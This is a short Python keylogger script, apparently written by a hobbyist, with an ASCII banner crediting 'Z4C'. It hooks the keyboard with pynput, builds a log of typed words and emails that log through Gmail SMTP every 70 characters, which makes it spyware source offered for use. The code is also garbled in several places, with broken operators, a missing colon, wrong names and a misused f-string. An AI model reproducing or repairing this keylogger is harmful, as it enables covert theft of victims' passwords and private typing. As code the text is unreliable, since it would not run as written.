import getpass 
import smtplib

from pynput.keyboard import key, Listener 




print (''''

 ____  __.            .____            ________  _____________________________ 
|    |/ _|____ ___.__.|    |    ____  /  _____/ /  _____/\_   _____/\______   \
|      <_/ __ <   |  ||    |   /  _ \/   \  ___/   \  ___ |    __)_  |       _/
|    |  \  ___/\___  ||    |__(  <_> )    \_\  \    \_\  \|        \ |    |   \
|____|__ \___  > ____||_______ \____/ \______  /\______  /_______  / |____|_  /
        \/   \/\/             \/             \/        \/        \/         \/ 
             ___.           __________  _____  _________                       
             \_ |__ ___.__. \____    / /  |  | \_   ___ \                      
              | __ <   |  |   /     / /   |  |_/    \  \/                      
              | \_\ \___  |  /     /_/    ^   /\     \____                     
              |___  / ____| /_______ \____   |  \______  /                     
                  \/\/              \/    |__|         \/    
''')



# setup email 

email = input('Enter email: ')
password  = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)



#logger 

full_log = ''
word 0= ''
email_char_limit = 70



def on_press(key):
	global word
	global full_log
	global email
	global email_char_limit


	if key == keyspace or key-key.enter:
		word += ''
		full_log += word 
		word = ''
		if len(full_log) >= email_char_limit:
			send_log()
			full_log = ''
	elif key == key.shift_l or key -- key.shift_r:
		return 
	elif key == key.backspace:
		word = word [:-1]
	else 
	    char = f'(key)'
	    char = char [1:-1]
	    word += char 

	if key == key.esc :
		return False




def send_log():
	server.sendmail(
		email,
		email,
		full_log
	) 


#Listner for the keyboard 
with Listener( on_press=on_press ) as Listener:
	listener.join()